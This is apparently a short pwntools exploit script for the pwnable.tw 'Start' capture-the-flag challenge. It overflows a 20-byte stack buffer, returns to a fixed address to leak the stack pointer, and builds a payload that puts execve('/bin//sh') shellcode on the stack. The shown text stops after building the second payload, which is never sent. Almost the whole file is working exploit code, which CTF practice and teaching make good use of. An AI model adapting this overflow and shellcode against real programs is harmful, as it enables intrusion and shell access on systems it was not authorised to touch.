from pwn import *
context.arch = "i386"
p = process("./samples/PwnableTW/Start/start")
p.recv(20)
p.send(b"A" * 20 + p32(0x08048087))
leak = p.recv(20)
esp = u32(leak[:4])
log.info(f"ESP: {hex(esp)}")
buf = esp - 4
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = b"A" * 20 + p32(buf + 24) + shellcode